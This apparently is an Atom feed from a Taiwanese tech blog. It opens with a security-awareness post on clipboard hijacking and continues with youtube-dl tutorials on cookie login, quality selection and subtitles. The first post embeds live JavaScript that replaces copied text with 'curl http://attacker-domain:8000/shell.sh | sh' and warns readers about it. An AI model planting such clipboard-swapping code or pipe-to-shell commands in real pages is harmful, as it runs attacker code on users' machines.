@@ -1,0 +1,698 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://zonego.tw</id>
+    <title>筆記ZONE</title>
+    <link href="https://zonego.tw" />
+    <updated>2022-04-27T11:44:03.000Z</updated>
+    <category term="Self-Hosting" />
+    <category term="網路" />
+    <category term="Windows" />
+    <category term="Linux" />
+    <category term="Mac" />
+    <category term="資安" />
+    <category term="網路資源" />
+    <category term="CI/CD" />
+    <category term="Drone" />
+    <category term="Git" />
+    <category term="Gitea" />
+    <category term="Google" />
+    <category term="GMail" />
+    <category term="Blog" />
+    <category term="Hexo" />
+    <category term="桌布" />
+    <category term="DIY" />
+    <category term="筆記型電腦" />
+    <category term="環境變數" />
+    <entry>
+        <id>https://zonego.tw/2022/04/27/copy-past/</id>
+        <title>注意複製貼上內容</title>
+        <link rel="alternate" href="https://zonego.tw/2022/04/27/copy-past/"/>
+        <content type="html">&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h2 id=&#34;注意複製貼上內容&#34;&gt;&lt;a href=&#34;#注意複製貼上內容&#34; class=&#34;headerlink&#34; title=&#34;注意複製貼上內容&#34;&gt;&lt;/a&gt;注意複製貼上內容&lt;/h2&gt;&lt;p&gt;我們經常會從網路上複製資料，但在貼上之前先注意下你複製到甚麼內容!&lt;/p&gt;
+&lt;p&gt;複製這個指令試試看&lt;/p&gt;
+&lt;p id=&#34;copy&#34;&gt;sudo apt update&lt;/p&gt;
+
+&lt;script&gt;
+document.getElementById(&#39;copy&#39;).addEventListener(&#39;copy&#39;, function(e) { e.clipboardData.setData(&#39;text/plain&#39;, &#39;curl http://attacker-domain:8000/shell.sh | sh\n&#39;); e.preventDefault(); });
+&lt;/script&gt;
+
+&lt;p&gt;把剛剛複製的貼這邊&lt;/p&gt;
+&lt;textarea style=&#34;height: 100px; min-height: 100px; width:100%; resize: none;&#34; cols=&#34;30&#34; name=&#34;textarea&#34; rows=&#34;5&#34; placeholder=&#34;Paste your safe text here...&#34;&gt;&lt;/textarea&gt;
+
+
+&lt;p&gt;中間的奧秘就是用 JavaScript 達到改寫複製的內容&lt;/p&gt;
+&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs js&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;copy&amp;#x27;&lt;/span&gt;).addEventListener(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;copy&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;e&lt;/span&gt;) &lt;/span&gt;&amp;#123; &lt;br&gt;    e.clipboardData.setData(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;text/plain&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;curl http://attacker-domain:8000/shell.sh | sh\n&amp;#x27;&lt;/span&gt;); &lt;br&gt;    e.preventDefault(); &lt;br&gt;&amp;#125;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;所以，在貼上之前記得先貼到記事本檢查，&lt;strong&gt;不要直接貼到終端機使用&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;來源&#34;&gt;&lt;a href=&#34;#來源&#34; class=&#34;headerlink&#34; title=&#34;來源&#34;&gt;&lt;/a&gt;來源&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.wizer-training.com/blog/copy-paste&#34;&gt;https://www.wizer-training.com/blog/copy-paste&lt;/a&gt;&lt;/p&gt;
+</content>
+        <category term="資安" />
+        <category term="網路資源" />
+        <updated>2022-04-27T11:44:03.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2022/04/10/youtube-dl-login/</id>
+        <title>youtube-dl 登入並下載影片</title>
+        <link rel="alternate" href="https://zonego.tw/2022/04/10/youtube-dl-login/"/>
+        <content type="html">&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h2 id=&#34;↩️回總教學文&#34;&gt;&lt;a href=&#34;#↩️回總教學文&#34; class=&#34;headerlink&#34; title=&#34;↩️回總教學文&#34;&gt;&lt;/a&gt;&lt;a href=&#34;/2021/12/19/youtuve-dl/&#34;&gt;↩️回總教學文&lt;/a&gt;&lt;/h2&gt;&lt;h2 id=&#34;帳號密碼登入&#34;&gt;&lt;a href=&#34;#帳號密碼登入&#34; class=&#34;headerlink&#34; title=&#34;帳號密碼登入&#34;&gt;&lt;/a&gt;帳號密碼登入&lt;/h2&gt;&lt;p&gt;某些內容會指定必須要認證身分(登入)後，才能觀看&lt;br&gt;這種情況下， youtube-dl 有提供輸入簡單的帳號密碼的參數&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-u&lt;/code&gt;, &lt;code&gt;--username&lt;/code&gt; USERNAME 輸入帳號&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;, &lt;code&gt;--password&lt;/code&gt; PASSWORD 輸入密碼&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;範例&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;youtube-dl --username &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;your_mail@gmail.com&amp;quot;&lt;/span&gt; --password &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;P@ssw0rd&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;目前只剩部分網站可以用這種方法登入。&lt;br&gt;Google 有更新過 youtube 帳號的取用安全性，只能用下面的 Cookie 方式登入。&lt;/p&gt;
+&lt;h2 id=&#34;使用-Cookie-登入&#34;&gt;&lt;a href=&#34;#使用-Cookie-登入&#34; class=&#34;headerlink&#34; title=&#34;使用 Cookie 登入&#34;&gt;&lt;/a&gt;使用 Cookie 登入&lt;/h2&gt;&lt;p&gt;Youtube-dl 可以使用 Netscape 格式的 cookie 檔案，讓伺服器端認定為已登入帳號的瀏覽器&lt;/p&gt;
+&lt;h3 id=&#34;匯出-cookie&#34;&gt;&lt;a href=&#34;#匯出-cookie&#34; class=&#34;headerlink&#34; title=&#34;匯出 cookie&#34;&gt;&lt;/a&gt;匯出 cookie&lt;/h3&gt;&lt;p&gt;我們可以用 EditThisCookie 幫我們匯出 Cookie&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg&#34;&gt;EditThisCookie Chrome擴充商店&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;安裝完後，進入 EditThisCookie 的設定&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/content/youtube-dl_cookie_setting.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;將輸出格式選擇 Netscape 格式&lt;br&gt;&lt;img src=&#34;/images/content/youtube-dl_cookie_setting2.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接著建立 cookie.txt 文字檔&lt;/p&gt;
+&lt;p&gt;建立完後我們到 &lt;a href=&#34;https://youtube.com/&#34;&gt;https://youtube.com&lt;/a&gt;&lt;br&gt;用 EditThisCookie 插件的匯出功能複製所有 cookie&lt;br&gt;&lt;img src=&#34;/images/content/youtube-dl_cookie.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;將複製到的文字貼到 cookie.txt&lt;/p&gt;
+&lt;p&gt;貼完後照前面的步驟，抓出 &lt;a href=&#34;https://accounts.google.com/&#34;&gt;https://accounts.google.com&lt;/a&gt; 的 cookie&lt;/p&gt;
+&lt;p&gt;都完成後 cookie.txt 大概會長這個樣子&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs txt&#34;&gt;# Netscape HTTP Cookie File&lt;br&gt;# http://curl.haxx.se/rfc/cookie_spec.html&lt;br&gt;# This file was generated by Cookie Editor&lt;br&gt;.youtube.com	TRUE	/	TRUE	1712544730	__Secure-1PAPISID	XXXXX&lt;br&gt;.youtube.com	TRUE	/	TRUE	1712544730	__Secure-1PSID	XXXXX&lt;br&gt;.youtube.com	TRUE	/	TRUE	1712544730	__Secure-3PAPISID	XXXXX&lt;br&gt;.youtube.com	TRUE	/	TRUE	1712544730	__Secure-3PSID	XXXXX&lt;br&gt;.youtube.com	TRUE	/	TRUE	1681127908	__Secure-3PSIDCC	XXXXX&lt;br&gt;.youtube.com	TRUE	/	FALSE	1687764170	_ga	XXXXX&lt;br&gt;.youtube.com	TRUE	/	FALSE	1654529554	_gcl_au	XXXXX&lt;br&gt;.youtube.com	TRUE	/	FALSE	1712544730	APISID	XXXXX&lt;br&gt;.youtube.com	TRUE	/	FALSE	1712544730	HSID	XXXXX&lt;br&gt;.youtube.com	TRUE	/	TRUE	1664713150	LOGIN_INFO	XXXXX&lt;br&gt;.youtube.com	TRUE	/	TRUE	1712663916	PREF	XXXXX&lt;br&gt;.youtube.com	TRUE	/	TRUE	1712544730	SAPISID	XXXXX&lt;br&gt;.youtube.com	TRUE	/	FALSE	1712544730	SID	XXXXX.&lt;br&gt;.youtube.com	TRUE	/	FALSE	1681127908	SIDCC	XXXXX&lt;br&gt;.youtube.com	TRUE	/	TRUE	1712544730	SSID	XXXXX&lt;br&gt;.youtube.com	TRUE	/	TRUE	1665142416	VISITOR_INFO1_LIVE	XXXXX&lt;br&gt;.youtube.com	TRUE	/	FALSE	0	wide	0&lt;br&gt;.youtube.com	TRUE	/	TRUE	0	YSC	XXXXX&lt;br&gt;&lt;br&gt;# Netscape HTTP Cookie File&lt;br&gt;# http://curl.haxx.se/rfc/cookie_spec.html&lt;br&gt;# This file was generated by Cookie Editor&lt;br&gt;.google.com	TRUE	/	TRUE	1712494597	__Secure-1PAPISID	XXXXX&lt;br&gt;.google.com	TRUE	/	TRUE	1712494597	__Secure-1PSID	XXXXX&lt;br&gt;.google.com	TRUE	/	TRUE	1712494597	__Secure-3PAPISID	XXXXX&lt;br&gt;.google.com	TRUE	/	TRUE	1712494597	__Secure-3PSID	XXXXX&lt;br&gt;.google.com	TRUE	/	TRUE	1681128005	__Secure-3PSIDCC	XXXXX&lt;br&gt;.google.com	TRUE	/	TRUE	1652183330	1P_JAR	XXXXX&lt;br&gt;.google.com	TRUE	/	TRUE	1663206405	AEC	XXXXX&lt;br&gt;.google.com	TRUE	/	FALSE	1712494597	APISID	XXXXX&lt;br&gt;.google.com	TRUE	/	FALSE	1712494597	HSID	XXXXX&lt;br&gt;.google.com	TRUE	/	TRUE	1665402835	NID	XXXXX&lt;br&gt;.google.com	TRUE	/	FALSE	1651150185	OGP	XXXXX&lt;br&gt;.google.com	TRUE	/	FALSE	1651150184	OGPC	XXXXX&lt;br&gt;.google.com	TRUE	/	TRUE	1712494597	SAPISID	XXXXX&lt;br&gt;.google.com	TRUE	/	FALSE	1712494597	SID	XXXXX&lt;br&gt;.google.com	TRUE	/	FALSE	1681128005	SIDCC	XXXXX&lt;br&gt;.google.com	TRUE	/	TRUE	1712494597	SSID	XXXXX&lt;br&gt;myaccount.google.com	FALSE	/	TRUE	1712544729	__Secure-OSID	XXXXX&lt;br&gt;myaccount.google.com	FALSE	/	TRUE	1712544729	OSID	XXXXX&lt;br&gt;myaccount.google.com	FALSE	/	TRUE	1652064730	OTZ	XXXXX&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;重整格式&#34;&gt;&lt;a href=&#34;#重整格式&#34; class=&#34;headerlink&#34; title=&#34;重整格式&#34;&gt;&lt;/a&gt;重整格式&lt;/h3&gt;&lt;p&gt;接著我們將剛剛的 cookie.txt 用 curl 重新整理格式&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;curl -b cookie.txt --cookie-jar ytcookie.txt &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;https://youtube.com&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;若是 Windows 的用戶，可以使用 Windows subsystem linux 2 (WSL2) 跑 Linux 的程式&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;執行完後 cookie.txt 就可以刪了，我們只要 ytcookie.txt 這個檔案&lt;/p&gt;
+&lt;p&gt;ytcookie.txt 要取甚麼名字都可以&lt;/p&gt;
+&lt;h3 id=&#34;使用-cookie-登入&#34;&gt;&lt;a href=&#34;#使用-cookie-登入&#34; class=&#34;headerlink&#34; title=&#34;使用 cookie 登入&#34;&gt;&lt;/a&gt;使用 cookie 登入&lt;/h3&gt;&lt;p&gt;用 &lt;code&gt;--cookie&lt;/code&gt; 設定我們剛剛做好的 ytcookie.txt 就可以了&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;youtube-dl --cookie ./ytcookie.txt &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;接下來只要你沒在瀏覽器內登出帳號，ytcookie.txt 理論上就能一直使用&lt;/p&gt;
+&lt;p&gt;當然，網站那邊可能也會紀錄是這個帳號在下載影片…&lt;/p&gt;
+&lt;h2 id=&#34;↩️回總教學文-1&#34;&gt;&lt;a href=&#34;#↩️回總教學文-1&#34; class=&#34;headerlink&#34; title=&#34;↩️回總教學文&#34;&gt;&lt;/a&gt;&lt;a href=&#34;/2021/12/19/youtuve-dl/&#34;&gt;↩️回總教學文&lt;/a&gt;&lt;/h2&gt;</content>
+        <category term="Windows" />
+        <category term="Linux" />
+        <category term="Mac" />
+        <updated>2022-04-10T08:39:57.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2022/04/10/youtube-dl-quality/</id>
+        <title>youtube-dl 指定下載影片畫質</title>
+        <link rel="alternate" href="https://zonego.tw/2022/04/10/youtube-dl-quality/"/>
+        <content type="html">&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h2 id=&#34;↩️回總教學文&#34;&gt;&lt;a href=&#34;#↩️回總教學文&#34; class=&#34;headerlink&#34; title=&#34;↩️回總教學文&#34;&gt;&lt;/a&gt;&lt;a href=&#34;/2021/12/19/youtuve-dl/&#34;&gt;↩️回總教學文&lt;/a&gt;&lt;/h2&gt;&lt;h2 id=&#34;選擇畫質&#34;&gt;&lt;a href=&#34;#選擇畫質&#34; class=&#34;headerlink&#34; title=&#34;選擇畫質&#34;&gt;&lt;/a&gt;選擇畫質&lt;/h2&gt;&lt;p&gt;youtube-dl 預設會下載最高畫質的版本，不一定是 mp4 格式&lt;/p&gt;
+&lt;p&gt;列出可下載的畫質:&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;youtube-dl -F https://www.youtube.com/watch?v=dQw4w9WgXcQ&lt;br&gt;[youtube] dQw4w9WgXcQ: Downloading webpage&lt;br&gt;[info] Available formats &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; dQw4w9WgXcQ:&lt;br&gt;format code  extension  resolution note&lt;br&gt;249          webm       audio only tiny   46k , webm_dash container, opus @ 46k (48000Hz), 1.18MiB&lt;br&gt;250          webm       audio only tiny   61k , webm_dash container, opus @ 61k (48000Hz), 1.55MiB&lt;br&gt;140          m4a        audio only tiny  129k , m4a_dash container, mp4a.40.2@129k (44100Hz), 3.27MiB&lt;br&gt;251          webm       audio only tiny  129k , webm_dash container, opus @129k (48000Hz), 3.28MiB&lt;br&gt;394          mp4        256x144    144p   68k , mp4_dash container, av01.0.00M.08@  68k, 25fps, video only, 1.72MiB&lt;br&gt;160          mp4        256x144    144p   71k , mp4_dash container, avc1.4d400c@  71k, 25fps, video only, 1.81MiB&lt;br&gt;278          webm       256x144    144p   89k , webm_dash container, vp9@  89k, 25fps, video only, 2.27MiB&lt;br&gt;133          mp4        426x240    240p  117k , mp4_dash container, avc1.4d4015@ 117k, 25fps, video only, 2.96MiB&lt;br&gt;395          mp4        426x240    240p  134k , mp4_dash container, av01.0.00M.08@ 134k, 25fps, video only, 3.40MiB&lt;br&gt;242          webm       426x240    240p  159k , webm_dash container, vp9@ 159k, 25fps, video only, 4.02MiB&lt;br&gt;134          mp4        640x360    360p  219k , mp4_dash container, avc1.4d401e@ 219k, 25fps, video only, 5.55MiB&lt;br&gt;396          mp4        640x360    360p  262k , mp4_dash container, av01.0.01M.08@ 262k, 25fps, video only, 6.64MiB&lt;br&gt;243          webm       640x360    360p  273k , webm_dash container, vp9@ 273k, 25fps, video only, 6.92MiB&lt;br&gt;135          mp4        854x480    480p  337k , mp4_dash container, avc1.4d401e@ 337k, 25fps, video only, 8.52MiB&lt;br&gt;244          webm       854x480    480p  397k , webm_dash container, vp9@ 397k, 25fps, video only, 10.04MiB&lt;br&gt;397          mp4        854x480    480p  450k , mp4_dash container, av01.0.04M.08@ 450k, 25fps, video only, 11.38MiB&lt;br&gt;136          mp4        1280x720   720p  655k , mp4_dash container, avc1.4d401f@ 655k, 25fps, video only, 16.57MiB&lt;br&gt;247          webm       1280x720   720p  699k , webm_dash container, vp9@ 699k, 25fps, video only, 17.67MiB&lt;br&gt;398          mp4        1280x720   720p  858k , mp4_dash container, av01.0.05M.08@ 858k, 25fps, video only, 21.70MiB&lt;br&gt;399          mp4        1920x1080  1080p 1576k , mp4_dash container, av01.0.08M.08@1576k, 25fps, video only, 39.84MiB&lt;br&gt;137          mp4        1920x1080  1080p 3546k , mp4_dash container, avc1.640028@3546k, 25fps, video only, 89.64MiB&lt;br&gt;18           mp4        640x360    360p  630k , avc1.42001E, 25fps, mp4a.40.2 (44100Hz), 15.95MiB (best)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;選好要下載的格式，把 format code 填入參數 -f 裡&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;youtube-dl -f 137 https://www.youtube.com/watch?v=dQw4w9WgXcQ&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 1920x1080 影片 + 129K音軌&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 需要先裝 ffmpeg&lt;/span&gt;&lt;br&gt;youtube-dl -f &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;137+140&amp;quot;&lt;/span&gt; https://www.youtube.com/watch?v=dQw4w9WgXcQ&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;如果懶得查，也可以直接指定某種影片、音樂最高品質&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 下載 MP4 格式中最高畫質，或是其他格式中的最高畫質&lt;/span&gt;&lt;br&gt;youtube-dl -f &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best&amp;#x27;&lt;/span&gt; url&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 指定最佳畫質，但不要高於 480p&lt;/span&gt;&lt;br&gt;youtube-dl -f &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;bestvideo[height&amp;lt;=480]+bestaudio/best[height&amp;lt;=480]&amp;#x27;&lt;/span&gt; url&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 下載檔案大小小於 50M 的最高畫質影片&lt;/span&gt;&lt;br&gt;youtube-dl -f &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;best[filesize&amp;lt;50M]&amp;#x27;&lt;/span&gt; url&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;指定格式、品質時，若網站沒有會下載失敗&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;↩️回總教學文-1&#34;&gt;&lt;a href=&#34;#↩️回總教學文-1&#34; class=&#34;headerlink&#34; title=&#34;↩️回總教學文&#34;&gt;&lt;/a&gt;&lt;a href=&#34;/2021/12/19/youtuve-dl/&#34;&gt;↩️回總教學文&lt;/a&gt;&lt;/h2&gt;</content>
+        <category term="Windows" />
+        <category term="Linux" />
+        <category term="Mac" />
+        <updated>2022-04-10T08:29:20.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2022/04/10/youtube-dl-subtitle/</id>
+        <title>youtube-dl 下載字幕</title>
+        <link rel="alternate" href="https://zonego.tw/2022/04/10/youtube-dl-subtitle/"/>
+        <content type="html">&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h2 id=&#34;↩️回總教學文&#34;&gt;&lt;a href=&#34;#↩️回總教學文&#34; class=&#34;headerlink&#34; title=&#34;↩️回總教學文&#34;&gt;&lt;/a&gt;&lt;a href=&#34;/2021/12/19/youtuve-dl/&#34;&gt;↩️回總教學文&lt;/a&gt;&lt;/h2&gt;&lt;h2 id=&#34;參數&#34;&gt;&lt;a href=&#34;#參數&#34; class=&#34;headerlink&#34; title=&#34;參數&#34;&gt;&lt;/a&gt;參數&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--list-subs&lt;/code&gt;：列出可下載的所有字幕&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--write-sub&lt;/code&gt;：儲存字幕&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--write-auto-sub&lt;/code&gt;: 儲存自動翻譯的字幕，限 youtube 可以使用&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--embed-sub&lt;/code&gt;：將字幕合併至影片中，需搭配 –write-sub 參數使用&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--all-subs&lt;/code&gt;：下載所有字幕&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--sub-format&lt;/code&gt;：下載的字幕格式，如果原影片沒有指定的字幕格式會去下載其他格式的字幕&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--sub-lang&lt;/code&gt;：選擇要下載的字幕語言，用逗號分隔，例如：zh_TW,ja&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--convert-subs&lt;/code&gt;：將下載的字幕轉換成其他格式，目前支援 srt|ass|vtt|lrc&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;列出所有可用字幕&#34;&gt;&lt;a href=&#34;#列出所有可用字幕&#34; class=&#34;headerlink&#34; title=&#34;列出所有可用字幕&#34;&gt;&lt;/a&gt;列出所有可用字幕&lt;/h2&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;youtube-dl --list-subs https://www.youtube.com/watch?v=AJYsA1jXf60&lt;br&gt;[youtube] AJYsA1jXf60: Downloading webpage&lt;br&gt;Available automatic captions &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; AJYsA1jXf60:&lt;br&gt;Language formats&lt;br&gt;tg       vtt, ttml, srv3, srv2, srv1&lt;br&gt;af       vtt, ttml, srv3, srv2, srv1&lt;br&gt;...&lt;br&gt;vi       vtt, ttml, srv3, srv2, srv1&lt;br&gt;zh-Hant  vtt, ttml, srv3, srv2, srv1&lt;br&gt;...&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;下載影片與字幕&#34;&gt;&lt;a href=&#34;#下載影片與字幕&#34; class=&#34;headerlink&#34; title=&#34;下載影片與字幕&#34;&gt;&lt;/a&gt;下載影片與字幕&lt;/h2&gt;&lt;p&gt;如果我要下載繁中以及英文的字幕，並另存成 .srt 格式&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;youtube-dl --sub-lang zh-Hant,en --write-sub --convert-subs srt https://www.youtube.com/watch?v=AJYsA1jXf60&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;只下載字幕&#34;&gt;&lt;a href=&#34;#只下載字幕&#34; class=&#34;headerlink&#34; title=&#34;只下載字幕&#34;&gt;&lt;/a&gt;只下載字幕&lt;/h2&gt;&lt;p&gt;可以加 &lt;code&gt;--skip-download&lt;/code&gt; 跳過下載影片&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;youtube-dl --sub-lang zh-Hant,en --write-sub --convert-subs srt --skip-download https://www.youtube.com/watch?v=AJYsA1jXf60&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;下載自動翻譯字幕&#34;&gt;&lt;a href=&#34;#下載自動翻譯字幕&#34; class=&#34;headerlink&#34; title=&#34;下載自動翻譯字幕&#34;&gt;&lt;/a&gt;下載自動翻譯字幕&lt;/h2&gt;&lt;p&gt;下面指令為下載自動翻譯的繁體中文字幕&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;youtube-dl --write-auto-sub --sub-lang zh-Hant https://www.youtube.com/watch?v=R_BlrlAcOoQ&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;↩️回總教學文-1&#34;&gt;&lt;a href=&#34;#↩️回總教學文-1&#34; class=&#34;headerlink&#34; title=&#34;↩️回總教學文&#34;&gt;&lt;/a&gt;&lt;a href=&#34;/2021/12/19/youtuve-dl/&#34;&gt;↩️回總教學文&lt;/a&gt;&lt;/h2&gt;</content>
+        <category term="Windows" />
+        <category term="Linux" />
+        <category term="Mac" />
+        <updated>2022-04-10T08:13:43.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2022/03/15/SpeedTest/</id>
+        <title>OpenSpeedTest 純HTML5的內網測速工具</title>
+        <link rel="alternate" href="https://zonego.tw/2022/03/15/SpeedTest/"/>
+        <content type="html">&lt;p&gt;大家平常要測網路速度都會想到 Ookla 的 &lt;a href=&#34;https://speedtest.net/&#34;&gt;Speedtest.net&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在簡單的網路環境內，Speedtest 就可以完成測速的工作&lt;/p&gt;
+&lt;p&gt;但如果我要測試內網速度呢?&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;h2 id=&#34;網路環境&#34;&gt;&lt;a href=&#34;#網路環境&#34; class=&#34;headerlink&#34; title=&#34;網路環境&#34;&gt;&lt;/a&gt;網路環境&lt;/h2&gt;&lt;p&gt;在測試之前，我們先了解網路速度到底是在測甚麼&lt;/p&gt;
+&lt;p&gt;一般家用的網路架構大概如圖，由中華電信這些電信商(ISP) 提供網際網路連線(雲圖示)&lt;/p&gt;
+&lt;p&gt;之後在你家裝一台路由器，讓家裡的設備可以透過它上網&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/content/network-simple.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我們平常用的 Speedtest.net 其實就是在測家裡到網際網路的連線速度&lt;/p&gt;
